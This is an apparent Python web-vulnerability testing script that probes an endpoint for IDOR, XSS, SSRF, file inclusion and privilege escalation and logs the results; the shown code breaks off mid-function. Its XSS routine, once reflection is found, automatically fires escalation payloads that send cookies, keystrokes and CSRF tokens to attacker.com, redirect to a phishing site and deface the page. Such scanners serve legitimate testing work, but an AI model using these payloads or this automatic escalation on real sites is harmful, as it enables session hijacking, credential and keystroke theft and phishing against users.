import requests
import logging
from datetime import datetime

# Set up logging
logging.basicConfig(filename='combined_vuln_test.log', level=logging.INFO)

def log_step(step_description):
    logging.info(f"{datetime.now()} - {step_description}")

def load_vulnerabilities(file_path):
    log_step(f"Loading vulnerabilities from file: {file_path}")
    with open(file_path, 'r') as file:
        vulnerabilities = file.readlines()
    log_step(f"Loaded {len(vulnerabilities)} vulnerabilities")
    return vulnerabilities

def test_idor(endpoint, param, user_ids, cookies=None):
    for user_id in user_ids:
        url = f"{endpoint}?{param}={user_id}"
        response = requests.get(url, cookies=cookies)
        
        log_step(f"Testing URL: {url}")
        log_step(f"Response Status Code: {response.status_code}")
        
        if response.status_code == 200:
            log_step(f"Potential IDOR vulnerability: Access granted for {user_id}")
        else:
            log_step(f"Access denied for {user_id}")

def test_xss(endpoint, param, payloads, cookies=None):
    for payload in payloads:
        url = f"{endpoint}?{param}={payload}"
        response = requests.get(url, cookies=cookies)
        
        log_step(f"Testing XSS with payload: {payload}")
        log_step(f"Response Status Code: {response.status_code}")
        
        if payload in response.text:
            log_step(f"Potential XSS vulnerability detected with payload '{payload}'")

            # Escalation techniques
            escalated_payloads = [
                "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
                "<script>window.location='http://phishing-site.com'</script>",
                "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+String.fromCharCode(e.which));}</script>",
                "<script>fetch('http://attacker.com/log?csrf_token='+document.querySelector('[name=\"csrf_token\"]').value);</script>",
                "<script>document.body.innerHTML='Hacked!';</script>"
            ]

            for esc_payload in escalated_payloads:
                esc_url = f"{endpoint}?{param}={esc_payload}"
                esc_response = requests.get(esc_url, cookies=cookies)
                log_step(f"Testing XSS escalation with payload: {esc_payload}")
                log_step(f"Response Status Code: {esc_response.status_code}")
        
        else:
            log_step(f"No XSS vulnerability detected with payload '{payload}'")

def test_ssrf(endpoint, param, urls, cookies=None):
    for url in urls:
        response = requests.get(f"{endpoint}?{param}={url}", cookies=cookies)
        
        log_step(f"Testing SSRF with URL: {url}")
        log_step(f"Response Status Code: {response.status_code}")
        
        if response.status_code == 200:
            log_step(f"Potential SSRF vulnerability with URL: {url}")
        else:
            log_step(f"SSRF attempt denied for URL: {url}")

def test_lfi_rfi(endpoint, param, paths, cookies=None):
    for path in paths:
        response = requests.get(f"{endpoint}?{param}={path}", cookies=cookies)
        
        log_step(f"Testing File Inclusion with path: {path}")
        log_step(f"Response Status Code: {response.status_code}")
        
        if "sensitive_data" in response.text:
            log_step(f"Potential File Inclusion vulnerability with path '{path}'")
        else:
            log_step(f"No File Inclusion detected with path '{path}'")

def test_privilege_escalation(endpoint, param, cookies, low_privilege_cookies):
    response = requests.get(f"{endpoint}?{param}", cookies=low_privilege_cookies)
    
    log_step(f"Testing Privilege Escalation with low privilege user")
    log_step(f"Response Status Code: {response.status_code}")
    
    if response.status_code == 200:
        log_step(f"Potential Privilege Escalation vulnerability detected")
    else:
        log_step
